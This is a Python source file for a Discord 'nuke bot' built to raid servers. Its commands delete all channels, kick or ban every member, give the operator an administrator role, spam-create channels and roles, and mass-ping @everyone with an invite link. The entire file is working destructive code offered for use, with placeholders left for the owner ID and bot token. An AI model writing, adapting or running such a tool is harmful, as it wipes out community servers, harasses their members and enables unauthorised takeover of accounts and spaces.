
import os 
import discord
from discord.ext import commands
import time
import threading


#abomb deletes all channels and does @everyone
#bbomb kicks everyone
#cbomb bans everyone
#dbomb gives admin
#cspam spam creates channels called 𝕟𝕦𝕜𝕖𝕕
#e     bans everyone and deletes all channels
#bozo spams channels called L Bozo
#fbomb deletes all channels
#espam spams channels and does @everyone

client = commands.Bot(command_prefix=commands.when_mentioned_or("d/", "D/"),  help_command=None)

print('''
██████╗░░█████╗░███╗░░░███╗██╗░██████╗  ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
██╔══██╗██╔══██╗████╗░████║╚█║██╔════╝  ████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
██║░░██║██║░░██║██╔████╔██║░╚╝╚█████╗░  ██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
██║░░██║██║░░██║██║╚██╔╝██║░░░░╚═══██╗  ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
██████╔╝╚█████╔╝██║░╚═╝░██║░░░██████╔╝  ██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
╚═════╝░░╚════╝░╚═╝░░░░░╚═╝░░░╚═════╝░  ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝''')

@client.event
async def on_ready():
  print('Nuke Bot Is Ready to go!')

owner = #YOUR DISCORD ID HERE

@client.command()
async def abomb(ctx):

  if ctx.author.id == owner:

    for chan in ctx.guild.channels:
        try:
            await chan.delete()
        except:
            pass

    await ctx.guild.create_text_channel('𝕟𝕦𝕜𝕖𝕕')
    channel = discord.utils.get(client.get_all_channels(), guild=ctx.author.guild, name='𝕟𝕦𝕜𝕖𝕕')
    await channel.send("@everyone\nKABOOOM\n")

  else:
    await ctx.send("No Lmao")


@client.command()
async def fbomb(ctx):

  if ctx.author.id == owner:

    for chan in ctx.guild.channels:
        try:
            await chan.delete()
        except:
            pass
  else:
    await ctx.send("No Lmao")


@client.command()
async def bbomb(ctx):

  if ctx.author.id == owner:


    for member in ctx.guild.members:
        try:
            if member == ctx.author:
                pass
            else: 
                await member.kick()
                await ctx.send(f"Successfully kicked {member}")
        
        except Exception as e:
            await ctx.send(f"Unable to kick {member} {e}")
  else:
    await ctx.send("No")

@client.command()
async def cbomb(ctx):

  if ctx.author.id == owner:

    for member in ctx.guild.members:
        try:
            if member == ctx.author:
                pass
            else: 
                await member.ban()
                await ctx.send(f"Successfully ban {member}")
        
        except Exception as e:
            await ctx.send(f"Unable to ban {member} {e}")
  else:
    await ctx.send("No")

@client.command()
async def dbomb(ctx):

  if ctx.author.id == owner:

    perms = discord.Permissions(administrator=True)
    role = await ctx.guild.create_role(name=".", permissions=perms)
    await ctx.author.add_roles(role)
    await ctx.message.delete()
  else:
    await ctx.send("No")

@client.command()
async def cspam(ctx):

  if ctx.author.id == owner:
      count = 0
      while count < 100:
          await ctx.guild.create_text_channel('𝕟𝕦𝕜𝕖𝕕')
          time.sleep(0.0000001)
          count = count + 1
  else:
    await ctx.send("No")

@client.command()
async def espam(ctx):

  if ctx.author.id == owner:
    count = 0
    while count < 25:
        await ctx.guild.create_text_channel('𝕟𝕦𝕜𝕖𝕕')
        count = count + 1
        if count == 25:
            for c in ctx.guild.text_channels:
                for i in range(5):
                    await c.send('@everyone')



  else:
    await ctx.send("No")

@client.command()
async def bozo(ctx):
  if ctx.author.id == owner:
    count = 50
    while count < 100:
      await ctx.guild.create_text_channel('𝕃 𝕓𝕠𝕫𝕠')
      time.sleep(0.0001)
      count = count + 1
  else:
    await ctx.send("No")



@client.command()
async def lll(ctx):
  if ctx.author.id == owner:
    count = 50
    while count < 100:
      await ctx.guild.create_text_channel('getnuked')
      channel = discord.utils.get(client.get_all_channels(), guild=ctx.author.guild, name='getnuked')
      await channel.send("@everyone\ndiscord.gg/rgkUMguqDj")
      time.sleep(0.0001)
      count = count + 1
  else:
    await ctx.send("No")


@client.command()
async def e(ctx):

  if ctx.author.id == owner:

    for member in ctx.guild.members:
        try:
            if member == ctx.author:
                pass
            else: 
                await member.ban()
                await ctx.send(f"Successfully ban {member}")
        
        except Exception as e:
            await ctx.send(f"Unable to ban {member} {e}")
    
    for chan in ctx.guild.channels:
        try:
            await chan.delete()
        except:
            pass

    await ctx.guild.create_text_channel('nuked')
    channel = discord.utils.get(client.get_all_channels(), guild=ctx.author.guild, name='nuked')
    await channel.send("KABOOOM\ndiscord.gg/rgkUMguqDj")
  else:
    await ctx.send("No")






@client.command()
async def rspam(ctx):

  if ctx.author.id == owner:
    spmrole = 1
    while spmrole < 100:
      spamrole = discord.Permissions(administrator=False)
      spamrole = await ctx.guild.create_role(name=".", permissions=spamrole)
      await ctx.author.add_roles(spamrole)
      await ctx.message.delete()

      spmrole = spmrole + 1
  else:
    await ctx.send("No")

client.run('YOUR BOT TOKEN HERE')